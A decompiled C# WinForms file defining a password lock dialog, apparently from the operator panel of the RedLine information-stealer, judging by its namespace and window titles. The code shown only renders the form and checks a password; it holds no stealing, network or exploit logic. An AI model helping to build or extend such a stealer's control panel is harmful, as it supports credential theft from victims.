using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;
using GuiLib;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using RedLine.MainPanel.Data.Extensions;

namespace RedLine.MainPanel.Views;

public class LockFrm : Form
{
	private object object_0;

	private object object_1;

	private object topHeader;

	private object mainTitle;

	private object closeBtn;

	private object unlockBtn;

	private object passwordLbl;

	private object passwordTb;

	private object minimizeBtn;

	public LockFrm(string password)
	{
		InitializeComponent();
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		object_0 = ConvertToSecureString(password);
		((SecureString)object_0).MakeReadOnly();
	}

	private void LockFrm_Paint(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void closeBtn_Click(object sender, object e)
	{
		Environment.Exit(0);
	}

	private void unlockBtn_Click(object sender, object e)
	{
		try
		{
			string text = ((AnimaTextBox)passwordTb).Text;
			if (string.IsNullOrWhiteSpace(text))
			{
				MessageBox.Show(this, "Please, enter a password");
				return;
			}
			SecureString s = ConvertToSecureString(text);
			if (method_0(object_0, s) == 0)
			{
				MessageBox.Show(this, "Invalid password");
				return;
			}
			base.DialogResult = DialogResult.OK;
			Close();
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	public SecureString ConvertToSecureString(string strPassword)
	{
		SecureString secureString = new SecureString();
		if (strPassword.Length > 0)
		{
			char[] array = strPassword.ToCharArray();
			foreach (char c in array)
			{
				secureString.AppendChar(c);
			}
		}
		return secureString;
	}

	private unsafe uint method_0(object s1, object s2)
	{
		if (s1 == null)
		{
			throw new ArgumentNullException("s1");
		}
		if (s2 != null)
		{
			if (((SecureString)s1).Length != ((SecureString)s2).Length)
			{
				return 0u;
			}
			IntPtr intPtr = IntPtr.Zero;
			IntPtr intPtr2 = IntPtr.Zero;
			RuntimeHelpers.PrepareConstrainedRegions();
			try
			{
				intPtr = Marshal.SecureStringToBSTR((SecureString)s1);
				intPtr2 = Marshal.SecureStringToBSTR((SecureString)s2);
				char* ptr = (char*)intPtr.ToPointer();
				char* ptr2 = (char*)intPtr2.ToPointer();
				while (*ptr != 0 && *ptr2 != 0)
				{
					if (*ptr == *ptr2)
					{
						ptr++;
						ptr2++;
						continue;
					}
					return 0u;
				}
				return 1u;
			}
			catch
			{
				return 0u;
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					Marshal.ZeroFreeBSTR(intPtr);
				}
				if (intPtr2 != IntPtr.Zero)
				{
					Marshal.ZeroFreeBSTR(intPtr2);
				}
			}
		}
		throw new ArgumentNullException("s2");
	}

	private void minimizeBtn_Click(object sender, object e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_1 != null)
		{
			((IDisposable)object_1).Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RedLine.MainPanel.Views.LockFrm));
		this.topHeader = new System.Windows.Forms.Panel();
		this.mainTitle = new System.Windows.Forms.Label();
		this.closeBtn = new System.Windows.Forms.Label();
		this.unlockBtn = new System.Windows.Forms.Button();
		this.passwordLbl = (object)new MetroSetLabel();
		this.passwordTb = (object)new AnimaTextBox();
		this.minimizeBtn = new System.Windows.Forms.Label();
		((System.Windows.Forms.Control)this.topHeader).SuspendLayout();
		base.SuspendLayout();
		((System.Windows.Forms.Control)this.topHeader).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.minimizeBtn);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.mainTitle);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.closeBtn);
		((System.Windows.Forms.Control)this.topHeader).Dock = System.Windows.Forms.DockStyle.Top;
		((System.Windows.Forms.Control)this.topHeader).ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.Control)this.topHeader).Location = new System.Drawing.Point(0, 0);
		((System.Windows.Forms.Control)this.topHeader).Name = "topHeader";
		((System.Windows.Forms.Control)this.topHeader).Size = new System.Drawing.Size(547, 30);
		((System.Windows.Forms.Control)this.topHeader).TabIndex = 4;
		((System.Windows.Forms.Control)this.topHeader).Paint += new System.Windows.Forms.PaintEventHandler(topHeader_Paint);
		((System.Windows.Forms.Control)this.mainTitle).AutoSize = true;
		((System.Windows.Forms.Control)this.mainTitle).Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.mainTitle).ForeColor = System.Drawing.Color.Red;
		((System.Windows.Forms.Control)this.mainTitle).Location = new System.Drawing.Point(3, 4);
		((System.Windows.Forms.Control)this.mainTitle).Name = "mainTitle";
		((System.Windows.Forms.Control)this.mainTitle).Size = new System.Drawing.Size(121, 20);
		((System.Windows.Forms.Control)this.mainTitle).TabIndex = 2;
		((System.Windows.Forms.Control)this.mainTitle).Text = "RedLine | Locked";
		((System.Windows.Forms.Control)this.closeBtn).AutoSize = true;
		((System.Windows.Forms.Control)this.closeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.closeBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.closeBtn).Location = new System.Drawing.Point(524, 4);
		((System.Windows.Forms.Control)this.closeBtn).Name = "closeBtn";
		((System.Windows.Forms.Control)this.closeBtn).Size = new System.Drawing.Size(20, 21);
		((System.Windows.Forms.Control)this.closeBtn).TabIndex = 1;
		((System.Windows.Forms.Control)this.closeBtn).Text = "X";
		((System.Windows.Forms.Control)this.closeBtn).Click += new System.EventHandler(closeBtn_Click);
		((System.Windows.Forms.Control)this.unlockBtn).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((System.Windows.Forms.ButtonBase)this.unlockBtn).FlatAppearance.BorderSize = 0;
		((System.Windows.Forms.ButtonBase)this.unlockBtn).FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		((System.Windows.Forms.Control)this.unlockBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((System.Windows.Forms.Control)this.unlockBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.unlockBtn).Location = new System.Drawing.Point(227, 98);
		((System.Windows.Forms.Control)this.unlockBtn).Name = "unlockBtn";
		((System.Windows.Forms.Control)this.unlockBtn).Size = new System.Drawing.Size(79, 26);
		((System.Windows.Forms.Control)this.unlockBtn).TabIndex = 13;
		((System.Windows.Forms.Control)this.unlockBtn).Text = "Unlock";
		((System.Windows.Forms.ButtonBase)this.unlockBtn).UseVisualStyleBackColor = false;
		((System.Windows.Forms.Control)this.unlockBtn).Click += new System.EventHandler(unlockBtn_Click);
		((System.Windows.Forms.Control)this.passwordLbl).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((System.Windows.Forms.Control)this.passwordLbl).Location = new System.Drawing.Point(42, 43);
		((System.Windows.Forms.Control)this.passwordLbl).Name = "passwordLbl";
		((System.Windows.Forms.Control)this.passwordLbl).Size = new System.Drawing.Size(100, 23);
		((MetroSetLabel)this.passwordLbl).Style = (Style)1;
		((MetroSetLabel)this.passwordLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.passwordLbl).TabIndex = 9;
		((System.Windows.Forms.Control)this.passwordLbl).Text = "Password:";
		((MetroSetLabel)this.passwordLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.passwordLbl).ThemeName = "MetroDark";
		((AnimaTextBox)this.passwordTb).Dark = false;
		((System.Windows.Forms.Control)this.passwordTb).Location = new System.Drawing.Point(42, 69);
		((AnimaTextBox)this.passwordTb).MaxLength = 32767;
		((AnimaTextBox)this.passwordTb).MultiLine = false;
		((System.Windows.Forms.Control)this.passwordTb).Name = "passwordTb";
		((AnimaTextBox)this.passwordTb).Numeric = false;
		((AnimaTextBox)this.passwordTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.passwordTb).Size = new System.Drawing.Size(479, 23);
		((System.Windows.Forms.Control)this.passwordTb).TabIndex = 31;
		((AnimaTextBox)this.passwordTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.minimizeBtn).AutoSize = true;
		((System.Windows.Forms.Control)this.minimizeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.minimizeBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.minimizeBtn).Location = new System.Drawing.Point(497, 4);
		((System.Windows.Forms.Control)this.minimizeBtn).Name = "minimizeBtn";
		((System.Windows.Forms.Control)this.minimizeBtn).Size = new System.Drawing.Size(21, 21);
		((System.Windows.Forms.Control)this.minimizeBtn).TabIndex = 4;
		((System.Windows.Forms.Control)this.minimizeBtn).Text = " _";
		((System.Windows.Forms.Control)this.minimizeBtn).Click += new System.EventHandler(minimizeBtn_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		base.ClientSize = new System.Drawing.Size(547, 136);
		base.Controls.Add((System.Windows.Forms.Control)this.passwordTb);
		base.Controls.Add((System.Windows.Forms.Control)this.unlockBtn);
		base.Controls.Add((System.Windows.Forms.Control)this.passwordLbl);
		base.Controls.Add((System.Windows.Forms.Control)this.topHeader);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "LockFrm";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "RedLine | Log In";
		base.Paint += new System.Windows.Forms.PaintEventHandler(LockFrm_Paint);
		((System.Windows.Forms.Control)this.topHeader).ResumeLayout(false);
		((System.Windows.Forms.Control)this.topHeader).PerformLayout();
		base.ResumeLayout(false);
	}
}
